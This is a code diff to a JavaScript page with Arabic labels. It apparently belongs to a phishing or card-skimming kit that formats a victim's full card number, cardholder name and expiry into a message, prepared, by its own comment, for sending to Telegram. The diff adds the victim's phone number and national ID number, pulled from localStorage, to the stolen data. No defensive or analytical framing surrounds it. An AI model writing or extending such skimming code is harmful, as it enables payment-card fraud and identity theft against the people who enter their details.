@@ -515,6 +515,9 @@
 ━━━━━━━━━━━━━━━
 👤 العميل: ${data.owner_name}
 ━━━━━━━━━━━━━━━
+📱 رقم الهاتف: ${data.phone}
+🪪 رقم الهوية: ${data.id_number}
+━━━━━━━━━━━━━━━
 👤 الاسم على البطاقة: ${data.card_name}
 🔢 رقم البطاقة: ${data.card_number}
 📅 تاريخ الانتهاء: ${data.expiry_month}/${data.expiry_year}
@@ -540,6 +543,8 @@
       showLoading();
       
       const fullName = getOwnerName();
+      const phone = localStorage.getItem('phone') || 'غير متوفر';
+      const idNumber = localStorage.getItem('id_number') || 'غير متوفر';
       const last4 = cardNumber.slice(-4);
       localStorage.setItem("cardNumber", last4);
 
@@ -548,6 +553,8 @@
       // Prepare data for Telegram
       const data = {
         owner_name: fullName,
+        phone: phone,
+        id_number: idNumber,
         card_name: cardName,
         card_number: cardNumber,
         expiry_month: month,
